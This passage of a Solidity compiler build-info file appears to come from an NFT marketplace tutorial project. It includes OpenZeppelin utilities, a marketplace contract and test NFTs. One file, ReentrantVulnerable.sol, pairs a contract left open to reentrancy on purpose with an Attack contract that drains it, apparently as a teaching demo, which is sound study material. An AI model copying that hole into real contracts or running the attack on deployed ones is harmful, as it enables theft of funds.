}\n}\n"},"@openzeppelin/contracts/utils/introspection/ERC165.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)\n\npragma solidity ^0.8.0;\n\nimport \"./IERC165.sol\";\n\n/**\n * @dev Implementation of the {IERC165} interface.\n *\n * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check\n * for the additional interface id that will be supported. For example:\n *\n * ```solidity\n * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {\n *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);\n * }\n * ```\n *\n * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.\n */\nabstract contract ERC165 is IERC165 {\n    /**\n     * @dev See {IERC165-supportsInterface}.\n     */\n    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {\n        return interfaceId == type(IERC165).interfaceId;\n    }\n}\n"},"@openzeppelin/contracts/utils/introspection/IERC165.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Interface of the ERC165 standard, as defined in the\n * https://eips.ethereum.org/EIPS/eip-165[EIP].\n *\n * Implementers can declare support of contract interfaces, which can then be\n * queried by others ({ERC165Checker}).\n *\n * For an implementation, see {ERC165}.\n */\ninterface IERC165 {\n    /**\n     * @dev Returns true if this contract implements the interface defined by\n     * `interfaceId`. See the corresponding\n     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]\n     * to learn more about how these ids are created.\n     *\n     * This function call must use less than 30 000 gas.\n     */\n    function supportsInterface(bytes4 interfaceId) external view returns (bool);\n}\n"},"@openzeppelin/contracts/utils/math/Math.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.8.0) (utils/math/Math.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Standard math utilities missing in the Solidity language.\n */\nlibrary Math {\n    enum Rounding {\n        Down, // Toward negative infinity\n        Up, // Toward infinity\n        Zero // Toward zero\n    }\n\n    /**\n     * @dev Returns the largest of two numbers.\n     */\n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a > b ? a : b;\n    }\n\n    /**\n     * @dev Returns the smallest of two numbers.\n     */\n    function min(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a < b ? a : b;\n    }\n\n    /**\n     * @dev Returns the average of two numbers. The result is rounded towards\n     * zero.\n     */\n    function average(uint256 a, uint256 b) internal pure returns (uint256) {\n        // (a + b) / 2 can overflow.\n        return (a & b) + (a ^ b) / 2;\n    }\n\n    /**\n     * @dev Returns the ceiling of the division of two numbers.\n     *\n     * This differs from standard division with `/` in that it rounds up instead\n     * of rounding down.\n     */\n    function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {\n        // (a + b - 1) / b can overflow on addition, so we distribute.\n        return a == 0 ? 0 : (a - 1) / b + 1;\n    }\n\n    /**\n     * @notice Calculates floor(x * y / denominator) with full precision. Throws if result overflows a uint256 or denominator == 0\n     * @dev Original credit to Remco Bloemen under MIT license (https://xn--2-umb.com/21/muldiv)\n     * with further edits by Uniswap Labs also under MIT license.\n     */\n    function mulDiv(\n        uint256 x,\n        uint256 y,\n        uint256 denominator\n    ) internal pure returns (uint256 result) {\n        unchecked {\n            // 512-bit multiply [prod1 prod0] = x * y. Compute the product mod 2^256 and mod 2^256 - 1, then use\n            // use the Chinese Remainder Theorem to reconstruct the 512 bit result. The result is stored in two 256\n            // variables such that product = prod1 * 2^256 + prod0.\n            uint256 prod0; // Least significant 256 bits of the product\n            uint256 prod1; // Most significant 256 bits of the product\n            assembly {\n                let mm := mulmod(x, y, not(0))\n                prod0 := mul(x, y)\n                prod1 := sub(sub(mm, prod0), lt(mm, prod0))\n            }\n\n            // Handle non-overflow cases, 256 by 256 division.\n            if (prod1 == 0) {\n                return prod0 / denominator;\n            }\n\n            // Make sure the result is less than 2^256. Also prevents denominator == 0.\n            require(denominator > prod1);\n\n            ///////////////////////////////////////////////\n            // 512 by 256 division.\n            ///////////////////////////////////////////////\n\n            // Make division exact by subtracting the remainder from [prod1 prod0].\n            uint256 remainder;\n            assembly {\n                // Compute remainder using mulmod.\n                remainder := mulmod(x, y, denominator)\n\n                // Subtract 256 bit number from 512 bit number.\n                prod1 := sub(prod1, gt(remainder, prod0))\n                prod0 := sub(prod0, remainder)\n            }\n\n            // Factor powers of two out of denominator and compute largest power of two divisor of denominator. Always >= 1.\n            // See https://cs.stackexchange.com/q/138556/92363.\n\n            // Does not overflow because the denominator cannot be zero at this stage in the function.\n            uint256 twos = denominator & (~denominator + 1);\n            assembly {\n                // Divide denominator by twos.\n                denominator := div(denominator, twos)\n\n                // Divide [prod1 prod0] by twos.\n                prod0 := div(prod0, twos)\n\n                // Flip twos such that it is 2^256 / twos. If twos is zero, then it becomes one.\n                twos := add(div(sub(0, twos), twos), 1)\n            }\n\n            // Shift in bits from prod1 into prod0.\n            prod0 |= prod1 * twos;\n\n            // Invert denominator mod 2^256. Now that denominator is an odd number, it has an inverse modulo 2^256 such\n            // that denominator * inv = 1 mod 2^256. Compute the inverse by starting with a seed that is correct for\n            // four bits. That is, denominator * inv = 1 mod 2^4.\n            uint256 inverse = (3 * denominator) ^ 2;\n\n            // Use the Newton-Raphson iteration to improve the precision. Thanks to Hensel's lifting lemma, this also works\n            // in modular arithmetic, doubling the correct bits in each step.\n            inverse *= 2 - denominator * inverse; // inverse mod 2^8\n            inverse *= 2 - denominator * inverse; // inverse mod 2^16\n            inverse *= 2 - denominator * inverse; // inverse mod 2^32\n            inverse *= 2 - denominator * inverse; // inverse mod 2^64\n            inverse *= 2 - denominator * inverse; // inverse mod 2^128\n            inverse *= 2 - denominator * inverse; // inverse mod 2^256\n\n            // Because the division is now exact we can divide by multiplying with the modular inverse of denominator.\n            // This will give us the correct result modulo 2^256. Since the preconditions guarantee that the outcome is\n            // less than 2^256, this is the final result. We don't need to compute the high bits of the result and prod1\n            // is no longer required.\n            result = prod0 * inverse;\n            return result;\n        }\n    }\n\n    /**\n     * @notice Calculates x * y / denominator with full precision, following the selected rounding direction.\n     */\n    function mulDiv(\n        uint256 x,\n        uint256 y,\n        uint256 denominator,\n        Rounding rounding\n    ) internal pure returns (uint256) {\n        uint256 result = mulDiv(x, y, denominator);\n        if (rounding == Rounding.Up && mulmod(x, y, denominator) > 0) {\n            result += 1;\n        }\n        return result;\n    }\n\n    /**\n     * @dev Returns the square root of a number. If the number is not a perfect square, the value is rounded down.\n     *\n     * Inspired by Henry S. Warren, Jr.'s \"Hacker's Delight\" (Chapter 11).\n     */\n    function sqrt(uint256 a) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        // For our first guess, we get the biggest power of 2 which is smaller than the square root of the target.\n        //\n        // We know that the \"msb\" (most significant bit) of our target number `a` is a power of 2 such that we have\n        // `msb(a) <= a < 2*msb(a)`. This value can be written `msb(a)=2**k` with `k=log2(a)`.\n        //\n        // This can be rewritten `2**log2(a) <= a < 2**(log2(a) + 1)`\n        // → `sqrt(2**k) <= sqrt(a) < sqrt(2**(k+1))`\n        // → `2**(k/2) <= sqrt(a) < 2**((k+1)/2) <= 2**(k/2 + 1)`\n        //\n        // Consequently, `2**(log2(a) / 2)` is a good first approximation of `sqrt(a)` with at least 1 correct bit.\n        uint256 result = 1 << (log2(a) >> 1);\n\n        // At this point `result` is an estimation with one bit of precision. We know the true value is a uint128,\n        // since it is the square root of a uint256. Newton's method converges quadratically (precision doubles at\n        // every iteration). We thus need at most 7 iteration to turn our partial result with one bit of precision\n        // into the expected uint128 result.\n        unchecked {\n            result = (result + a / result) >> 1;\n            result = (result + a / result) >> 1;\n            result = (result + a / result) >> 1;\n            result = (result + a / result) >> 1;\n            result = (result + a / result) >> 1;\n            result = (result + a / result) >> 1;\n            result = (result + a / result) >> 1;\n            return min(result, a / result);\n        }\n    }\n\n    /**\n     * @notice Calculates sqrt(a), following the selected rounding direction.\n     */\n    function sqrt(uint256 a, Rounding rounding) internal pure returns (uint256) {\n        unchecked {\n            uint256 result = sqrt(a);\n            return result + (rounding == Rounding.Up && result * result < a ? 1 : 0);\n        }\n    }\n\n    /**\n     * @dev Return the log in base 2, rounded down, of a positive value.\n     * Returns 0 if given 0.\n     */\n    function log2(uint256 value) internal pure returns (uint256) {\n        uint256 result = 0;\n        unchecked {\n            if (value >> 128 > 0) {\n                value >>= 128;\n                result += 128;\n            }\n            if (value >> 64 > 0) {\n                value >>= 64;\n                result += 64;\n            }\n            if (value >> 32 > 0) {\n                value >>= 32;\n                result += 32;\n            }\n            if (value >> 16 > 0) {\n                value >>= 16;\n                result += 16;\n            }\n            if (value >> 8 > 0) {\n                value >>= 8;\n                result += 8;\n            }\n            if (value >> 4 > 0) {\n                value >>= 4;\n                result += 4;\n            }\n            if (value >> 2 > 0) {\n                value >>= 2;\n                result += 2;\n            }\n            if (value >> 1 > 0) {\n                result += 1;\n            }\n        }\n        return result;\n    }\n\n    /**\n     * @dev Return the log in base 2, following the selected rounding direction, of a positive value.\n     * Returns 0 if given 0.\n     */\n    function log2(uint256 value, Rounding rounding) internal pure returns (uint256) {\n        unchecked {\n            uint256 result = log2(value);\n            return result + (rounding == Rounding.Up && 1 << result < value ? 1 : 0);\n        }\n    }\n\n    /**\n     * @dev Return the log in base 10, rounded down, of a positive value.\n     * Returns 0 if given 0.\n     */\n    function log10(uint256 value) internal pure returns (uint256) {\n        uint256 result = 0;\n        unchecked {\n            if (value >= 10**64) {\n                value /= 10**64;\n                result += 64;\n            }\n            if (value >= 10**32) {\n                value /= 10**32;\n                result += 32;\n            }\n            if (value >= 10**16) {\n                value /= 10**16;\n                result += 16;\n            }\n            if (value >= 10**8) {\n                value /= 10**8;\n                result += 8;\n            }\n            if (value >= 10**4) {\n                value /= 10**4;\n                result += 4;\n            }\n            if (value >= 10**2) {\n                value /= 10**2;\n                result += 2;\n            }\n            if (value >= 10**1) {\n                result += 1;\n            }\n        }\n        return result;\n    }\n\n    /**\n     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.\n     * Returns 0 if given 0.\n     */\n    function log10(uint256 value, Rounding rounding) internal pure returns (uint256) {\n        unchecked {\n            uint256 result = log10(value);\n            return result + (rounding == Rounding.Up && 10**result < value ? 1 : 0);\n        }\n    }\n\n    /**\n     * @dev Return the log in base 256, rounded down, of a positive value.\n     * Returns 0 if given 0.\n     *\n     * Adding one to the result gives the number of pairs of hex symbols needed to represent `value` as a hex string.\n     */\n    function log256(uint256 value) internal pure returns (uint256) {\n        uint256 result = 0;\n        unchecked {\n            if (value >> 128 > 0) {\n                value >>= 128;\n                result += 16;\n            }\n            if (value >> 64 > 0) {\n                value >>= 64;\n                result += 8;\n            }\n            if (value >> 32 > 0) {\n                value >>= 32;\n                result += 4;\n            }\n            if (value >> 16 > 0) {\n                value >>= 16;\n                result += 2;\n            }\n            if (value >> 8 > 0) {\n                result += 1;\n            }\n        }\n        return result;\n    }\n\n    /**\n     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.\n     * Returns 0 if given 0.\n     */\n    function log256(uint256 value, Rounding rounding) internal pure returns (uint256) {\n        unchecked {\n            uint256 result = log256(value);\n            return result + (rounding == Rounding.Up && 1 << (result * 8) < value ? 1 : 0);\n        }\n    }\n}\n"},"@openzeppelin/contracts/utils/Strings.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.8.0) (utils/Strings.sol)\n\npragma solidity ^0.8.0;\n\nimport \"./math/Math.sol\";\n\n/**\n * @dev String operations.\n */\nlibrary Strings {\n    bytes16 private constant _SYMBOLS = \"0123456789abcdef\";\n    uint8 private constant _ADDRESS_LENGTH = 20;\n\n    /**\n     * @dev Converts a `uint256` to its ASCII `string` decimal representation.\n     */\n    function toString(uint256 value) internal pure returns (string memory) {\n        unchecked {\n            uint256 length = Math.log10(value) + 1;\n            string memory buffer = new string(length);\n            uint256 ptr;\n            /// @solidity memory-safe-assembly\n            assembly {\n                ptr := add(buffer, add(32, length))\n            }\n            while (true) {\n                ptr--;\n                /// @solidity memory-safe-assembly\n                assembly {\n                    mstore8(ptr, byte(mod(value, 10), _SYMBOLS))\n                }\n                value /= 10;\n                if (value == 0) break;\n            }\n            return buffer;\n        }\n    }\n\n    /**\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.\n     */\n    function toHexString(uint256 value) internal pure returns (string memory) {\n        unchecked {\n            return toHexString(value, Math.log256(value) + 1);\n        }\n    }\n\n    /**\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.\n     */\n    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {\n        bytes memory buffer = new bytes(2 * length + 2);\n        buffer[0] = \"0\";\n        buffer[1] = \"x\";\n        for (uint256 i = 2 * length + 1; i > 1; --i) {\n            buffer[i] = _SYMBOLS[value & 0xf];\n            value >>= 4;\n        }\n        require(value == 0, \"Strings: hex length insufficient\");\n        return string(buffer);\n    }\n\n    /**\n     * @dev Converts an `address` with fixed length of 20 bytes to its not checksummed ASCII `string` hexadecimal representation.\n     */\n    function toHexString(address addr) internal pure returns (string memory) {\n        return toHexString(uint256(uint160(addr)), _ADDRESS_LENGTH);\n    }\n}\n"},"contracts/NftMarketplace.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.7;\nimport \"@openzeppelin/contracts/token/ERC721/IERC721.sol\";\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\n\nerror PriceNotMet(address nftAddress, uint256 tokenId, uint256 price);\nerror ItemNotForSale(address nftAddress, uint256 tokenId);\nerror NotListed(address nftAddress, uint256 tokenId);\nerror AlreadyListed(address nftAddress, uint256 tokenId);\nerror NoProceeds();\nerror NotOwner();\nerror NotApprovedForMarketplace();\nerror PriceMustBeAboveZero();\n\ncontract NftMarketplace is ReentrancyGuard {\n    struct Listing {\n        uint256 price;\n        address seller;\n    }\n    event ItemListed(\n        address indexed seller,\n        address indexed nftAddress,\n        uint256 indexed tokenId,\n        uint256 price\n    );\n    event ItemCanceled(\n        address indexed seller,\n        address indexed nftAddress,\n        uint256 indexed tokenId\n    );\n    event ItemBought(\n        address indexed seller,\n        address indexed nftAddress,\n        uint256 indexed tokenId,\n        uint256 price\n    );\n    mapping(address => mapping(uint256 => Listing)) private s_listings;\n    mapping(address => uint256) private s_proceeds;\n    modifier notListed(address nftAddress, uint256 tokenId) {\n        Listing memory listing = s_listings[nftAddress][tokenId];\n        if (listing.price > 0) {\n            revert AlreadyListed(nftAddress, tokenId);\n        }\n        _;\n    }\n    modifier isListed(address nftAddress, uint256 tokenId) {\n        Listing memory listing = s_listings[nftAddress][tokenId];\n        if (listing.price <= 0) {\n            revert NotListed(nftAddress, tokenId);\n        }\n        _;\n    }\n    modifier isOwner(\n        address nftAddress,\n        uint256 tokenId,\n        address spender\n    ) {\n        IERC721 nft = IERC721(nftAddress);\n        address owner = nft.ownerOf(tokenId);\n        if (spender != owner) {\n            revert NotOwner();\n        }\n        _;\n    }\n\n    function listItem(\n        address nftAddress,\n        uint256 tokenId,\n        uint256 price\n    )\n        external\n        notListed(nftAddress, tokenId)\n        isOwner(nftAddress, tokenId, msg.sender)\n    {\n        if (price <= 0) {\n            revert PriceMustBeAboveZero();\n        }\n        IERC721 nft = IERC721(nftAddress);\n        if (nft.getApproved(tokenId) != address(this)) {\n            revert NotApprovedForMarketplace();\n        }\n        s_listings[nftAddress][tokenId] = Listing(price, msg.sender);\n        emit ItemListed(msg.sender, nftAddress, tokenId, price);\n    }\n\n    function cancelListing(\n        address nftAddress,\n        uint256 tokenId\n    )\n        external\n        isOwner(nftAddress, tokenId, msg.sender)\n        isListed(nftAddress, tokenId)\n    {\n        delete (s_listings[nftAddress][tokenId]);\n        emit ItemCanceled(msg.sender, nftAddress, tokenId);\n    }\n\n    function buyItem(\n        address nftAddress,\n        uint256 tokenId\n    ) external payable isListed(nftAddress, tokenId) nonReentrant {\n        Listing memory listedItem = s_listings[nftAddress][tokenId];\n        if (msg.value < listedItem.price) {\n            revert PriceNotMet(nftAddress, tokenId, listedItem.price);\n        }\n        s_proceeds[listedItem.seller] += msg.value;\n        delete (s_listings[nftAddress][tokenId]);\n        IERC721(nftAddress).safeTransferFrom(\n            listedItem.seller,\n            msg.sender,\n            tokenId\n        );\n        emit ItemBought(msg.sender, nftAddress, tokenId, listedItem.price);\n    }\n\n    function updateListing(\n        address nftAddress,\n        uint256 tokenId,\n        uint256 newPrice\n    )\n        external\n        isListed(nftAddress, tokenId)\n        nonReentrant\n        isOwner(nftAddress, tokenId, msg.sender)\n    {\n        if (newPrice <= 0) {\n            revert PriceMustBeAboveZero();\n        }\n        s_listings[nftAddress][tokenId].price = newPrice;\n        emit ItemListed(msg.sender, nftAddress, tokenId, newPrice);\n    }\n\n    function withdrawProceeds() external {\n        uint256 proceeds = s_proceeds[msg.sender];\n        if (proceeds <= 0) {\n            revert NoProceeds();\n        }\n        s_proceeds[msg.sender] = 0;\n        (bool success, ) = payable(msg.sender).call{value: proceeds}(\"\");\n        require(success, \"Transfer failed\");\n    }\n\n    function getListing(\n        address nftAddress,\n        uint256 tokenId\n    ) external view returns (Listing memory) {\n        return s_listings[nftAddress][tokenId];\n    }\n\n    function getProceeds(address seller) external view returns (uint256) {\n        return s_proceeds[seller];\n    }\n}\n"},"contracts/sub/ReentrantVulnerable.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.7;\n\ncontract ReentrantVulnerable {\n    mapping(address => uint256) public balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdraw() public {\n        uint256 bal = balances[msg.sender];\n        require(bal > 0);\n        (bool sent, ) = msg.sender.call{value: bal}(\"\");\n        require(sent, \"Failed to send ether \");\n    }\n\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\ncontract Attack {\n    ReentrantVulnerable public reentrantVulnerable;\n\n    constructor(address _reentrantVulnerable) {\n        reentrantVulnerable = ReentrantVulnerable(_reentrantVulnerable);\n    }\n\n    fallback() external payable {\n        if (address(reentrantVulnerable).balance >= 1 ether) {\n            reentrantVulnerable.withdraw();\n        }\n    }\n\n    receive() external payable {\n        revert(\"i got no idea\");\n    }\n\n    function attack() external payable {\n        require(msg.value >= 1 ether);\n        reentrantVulnerable.deposit{value: 1 ether}();\n        reentrantVulnerable.withdraw();\n    }\n\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n"},"contracts/test/BasicNft.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.7;\n\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\n\ncontract BasicNft is ERC721 {\n    string public constant TOKEN_URI =\n        \"ipfs://bafybeig37ioir76s7mg5oobetncojcm3c3hxasyd4rvid4jqhy4gkaheg4/?filename=0-PUG.json\";\n    uint256 private s_tokenCounter;\n    event DogMinted(uint256 indexed tokenId);\n\n    constructor() ERC721(\"Dogie\", \"DOG\") {\n        s_tokenCounter = 0;\n    }\n\n    function mintNft() public {\n        _safeMint(msg.sender, s_tokenCounter);\n        emit DogMinted(s_tokenCounter);\n        s_tokenCounter = s_tokenCounter + 1;\n    }\n\n    function tokenURI(\n        uint256 tokenId\n    ) public view override returns (string memory) {\n        require(\n            _exists(tokenId),\n            \"ERC721 Metadata: URI query for nonexistent token\"\n        );\n        return TOKEN_URI;\n    }\n\n    function getTokenCounter() public view returns (uint256) {\n        return s_tokenCounter;\n    }\n}\n"},"contracts/test/BasicNftTwo.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.7;\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\n\ncontract BasicNftTwo is ERC721 {\n    string public constant TOKEN_URI =\n        \"ipfs://QmdryoExpgEQQQgJPoruwGJyZmz6SqV4FRTX1i73CT3iXn\";\n    uint256 private s_tokenCounter;\n    event DogMinted(uint256 indexed tokenId);\n\n    constructor() ERC721(\"Dogie\", \"DOG\") {\n        s_tokenCounter = 0;\n    }\n\n    function mintNft() public {\n        _safeMint(msg.sender, s_tokenCounter);\n        emit DogMinted(s_tokenCounter);\n        s_tokenCounter = s_tokenCounter + 1;\n    }\n\n    function tokenURI(\n        uint256 tokenId\n    ) public view override returns (string memory) {\n        require(\n            _exists(tokenId),\n            \"ERC721Metadata : URI query for nonexistent token\"\n        );\n    }\n\n    function getTokenCounter() public view returns (uint256) {\n        return s_tokenCounter;\n    }\n}\n"}},"settings":{"optimizer":{"enabled":false,"runs":200},"outputSelection":{"*":{"*":["abi","evm.bytecode","evm.deployedBytecode","evm.methodIdentifiers","metadata","devdoc","userdoc","storageLayout","evm.gasEstimates"],"":["ast"]}},"metadata":{"useLiteralContent":true}}},"output":{"errors":[{"component":"general","errorCode":"6321","formattedMessage":"Warning: Unnamed return variable can remain unassigned. Add an explicit return with value to all non-reverting code paths or name the variable.\n  --> contracts/test/BasicNftTwo.sol:23:37:\n   |\n23 |     ) public view override returns (string memory) {\n   |                                     ^^^^^^^^^^^^^\n\n","message":"Unnamed return variable can remain unassigned. Add an explicit return with value to all non-reverting code paths or name the variable.","severity":"warning","sourceLocation":{"end":680,"file":"contracts/test/BasicNftTwo.sol","start":667},"type":"Warning"}],"sources":{"@openzeppelin/contracts/security/ReentrancyGuard.sol":{"ast":{"absolutePath":"@openzeppelin/contracts/security/ReentrancyGuard.sol","exportedSymbols":{"ReentrancyGuard":[53]},"id":54,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":1,"literals":["solidity","^","0.8",".0"],"nodeType":"PragmaDirective","src":"112:23:0"},{"abstract":true,"baseContracts":[],"contractDependencies":[],"contractKind":"contract","documentation":{"id":2,"nodeType":"StructuredDocumentation","src":"137:750:0","text":" @dev Contract module that helps prevent reentrant calls to a function.\n Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier\n available, which can be applied to functions to make sure there are no nested\n (reentrant) calls to them.\n Note that because there is a single `nonReentrant` guard, functions marked as\n `nonReentrant` may not call one another. This can be worked around by making\n those functions `private`, and then adding `external` `nonReentrant` entry\n points to them.\n TIP: If you would like to learn more about reentrancy and alternative ways\n to protect against it, check out our blog post\n https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul]."},"fullyImplemented":true,"id":53,"linearizedBaseContracts":[53],"name":"ReentrancyGuard","nameLocation":"906:15:0","nodeType":"ContractDefinition","nodes":[{"constant":true,"id":5,"mutability":"constant","name":"_NOT_ENTERED","nameLocation":"1701:12:0","nodeType":"VariableDeclaration","scope":53,"src":"1676:41:0","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3,"name":"uint256","nodeType":"ElementaryTypeName","src":"1676:7:0","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"value":{"hexValue":"31","id":4,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1716:1:0","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"visibility":"private"},{"constant":true,"id":8,"mutability":"constant","name":"_ENTERED","nameLocation":"1748:8:0","nodeType":"VariableDeclaration","scope":53,"src":"1723:37:0","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":6,"name":"uint256","nodeType":"ElementaryTypeName","src":"1723:7:0","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"value":{"hexValue":"32","id":7,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1759:1:0","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"visibility":"private"},{"constant":false,"id":10,"mutability":"mutable","name":"_status","nameLocation":"1783:7:0","nodeType":"VariableDeclaration","scope":53,"src":"1767:23:0","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":9,"name":"uint256","nodeType":"ElementaryTypeName","src":"1767:7:0","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"private"},{"body":{"id":17,"nodeType":"Block","src":"1811:39:0","statements":[{"expression":{"id":15,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":13,"name":"_status","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":10,"src":"1821:7:0","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"id":14,"name":"_NOT_ENTERED","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5,"src":"1831:12:0","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"1821:22:0","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":16,"nodeType":"ExpressionStatement","src":"1821:22:0"}]},"id":18,"implemented":true,"kind":"constructor","modifiers":[],"name":"","nameLocation":"-1:-1:-1","nodeType":"FunctionDefinition","parameters":{"id":11,"nodeType":"ParameterList","parameters":[],"src":"1808:2:0"},"returnParameters":{"id":12,"nodeType":"ParameterList","parameters":[],"src":"1811:0:0"},"scope":53,"src":"1797:53:0","stateMutability":"nonpayable","virtual":false,"visibility":"internal"},{"body":{"id":28,"nodeType":"Block","src":"2251:79:0","statements":[{"expression":{"arguments":[],"expression":{"argumentTypes":[],"id":21,"name":"_nonReentrantBefore","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":44,"src":"2261:19:0","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$__$returns$__$","typeString":"function ()"}},"id":22,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"2261:21:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":23,"nodeType":"ExpressionStatement","src":"2261:21:0"},{"id":24,"nodeType":"PlaceholderStatement","src":"2292:1:0"},{"expression":{"arguments":[],"expression":{"argumentTypes":[],"id":25,"name":"_nonReentrantAfter","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":52,"src":"2303:18:0","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$__$returns$__$","typeString":"function ()"}},"id":26,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"2303:20:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":27,"nodeType":"ExpressionStatement","src":"2303:20:0"}]},"documentation":{"id":19,"nodeType":"StructuredDocumentation","src":"1856:366:0","text":" @dev Prevents a contract from calling itself, directly or indirectly.\n Calling a `nonReentrant` function from another `nonReentrant`\n function is not supported. It is possible to prevent this from happening\n by making the `nonReentrant` function external, and making it call a\n `private` function that does the actual work."},"id":29,"name":"nonReentrant","nameLocation":"2236:12:0","nodeType":"ModifierDefinition","parameters":{"id":20,"nodeType":"ParameterList","parameters":[],"src":"2248:2:0"},"src":"2227:103:0","virtual":false,"visibility":"internal"},{"body":{"id":43,"nodeType":"Block","src":"2375:248:0","statements":[{"expression":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":35,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":33,"name":"_status","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":10,"src":"2468:7:0","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":34,"name":"_ENTERED","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":8,"src":"2479:8:0","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"2468:19:0","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"hexValue":"5265656e7472616e637947756172643a207265656e7472616e742063616c6c","id":36,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"2489:33:0","typeDescriptions":{"typeIdentifier":"t_stringliteral_ebf73bba305590e4764d5cb53b69bffd6d4d092d1a67551cb346f8cfcdab8619","typeString":"literal_string \"ReentrancyGuard: reentrant call\""},"value":"ReentrancyGuard: reentrant call"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_stringliteral_ebf73bba305590e4764d5cb53b69bffd6d4d092d1a67551cb346f8cfcdab8619","typeString":"literal_string \"ReentrancyGuard: reentrant call\""}],"id":32,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"2460:7:0","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$","typeString":"function (bool,string memory) 